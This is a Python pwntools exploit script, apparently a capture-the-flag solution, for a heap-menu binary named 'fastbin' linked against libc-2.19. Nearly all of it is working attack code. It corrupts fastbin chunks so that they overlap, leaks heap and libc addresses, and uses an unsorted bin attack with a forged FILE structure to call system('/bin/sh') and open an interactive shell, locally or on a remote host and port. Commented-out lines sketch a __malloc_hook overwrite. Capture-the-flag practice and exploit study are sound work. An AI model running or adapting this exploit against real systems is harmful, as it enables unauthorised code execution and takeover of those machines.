#!/usr/bin/env python

from pwn import *
import sys
context(log_level = "debug")
def alloc(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.recvuntil(': ', timeout=1)

def fill(idx, data):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data

def exploit(r):
    libc = ELF("./libc-2.19.so")
    r.recvuntil(': ')

    alloc(0x20)
    alloc(0x20)
    alloc(0x20)
    alloc(0x20)
    alloc(0x50)#4
    alloc(0x50)#5
    alloc(0x50)#6
    free(1)
    free(2)
# over lap
    payload  = p64(0)*5
    payload += p64(0x31)
    payload += p64(0)*5
    payload += p64(0x31)
    payload += p8(0xc0)
    fill(0, payload)

    payload  = p64(0)*5
    payload += p64(0x31)
    fill(3, payload)

    alloc(0x20) #1
    alloc(0x20) #2

# leak heap
    
    free(5)
    payload  = p64(0)*5
    payload += p64(0x61)
    fill(3, payload)

    free(4)
    heap_addr = u64(dump(2)[:8]) - 0x120
    print "heap_addr = "+hex(heap_addr)
    alloc(0x50)
    alloc(0x50)

# leak libc

    payload  = p64(0)*5
    payload += p64(0xc1)
    fill(3, payload)

    #raw_input()
    # alloc(0x50)
    
    free(4)
    # dump(2)
    main_area = u64(dump(2)[:8])
    libc_base = main_area - 0x3a5678
    
    libc.address = libc_base

    alloc(0x50)#4
    alloc(0x58)#7
    alloc(0x30)#8
    alloc(0x20)#9
    alloc(0x20)#10
    alloc(0x58)
    payload = p64(0)*5+p64(0x61+0x60)
    fill(3, payload)

    free(4)

    fill(5,"\x00"*(0x50)+p64(0)+p64(0x61+0x60+0x40))

    free(6)
    alloc(0x58) #4
    log.info("libc_base: " + hex(libc_base))
    # print "b*"+hex(0x7CE9A+libc_base)
    # print util.proc.pidof(r)

    # raw_input()
    # unsorted bin attack 
    payload  = "\x00"*0x50+p64(0)+p64(0xd1)+p64(main_area)+p64(libc_base+0x3A6040-0x10)
    payload  = payload.ljust(0x100-0x50,"\x00")

    data = "/bin/sh\x00"+p64(0x101)
    data += p64(0)+p64(0)
    data += p64(0)+p64(1)
    data = data.ljust(0xc0,"\x00")
    data += p64(0xffffffffffffffff)
    data = data.ljust(0xd8,"\x00")
    data += p64(heap_addr+0x30*4+0x10+len(payload+data)-0x18+8)
    data += p64(libc.symbols["system"])

    
    fill(4,payload+data)



    alloc(0x58)
    # dump(2)

    
    # raw_input()
    # raw_input()
    # fill(2,p64(main_area)+p64(libc_base+0x3C5600-0x10))

    # print "IO_LIST="+hex(libc_base+0x3C5600)
    # alloc(0x58)#4
    # alloc(0x20)#7
    # alloc(0x20)#8
    # free(4)
    
    # fill(3,p64(0)*5+p64(0x71))
    # fill(2, p64(libc.symbols['__malloc_hook']-0x23))
    # raw_input()
    # alloc(0x58)#9
    # alloc(0x58)
    # alloc(0x30)#10
    # raw_input()
    # payload  = '\x00'*3
    # payload += p64(0)*2
    # payload += p64(libc_base + 0x41374)
    # fill(6, payload)

    # alloc(255)

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./fastbin'], env={"LD_PRELOAD":"./libc.so.6"})
        
        exploit(r)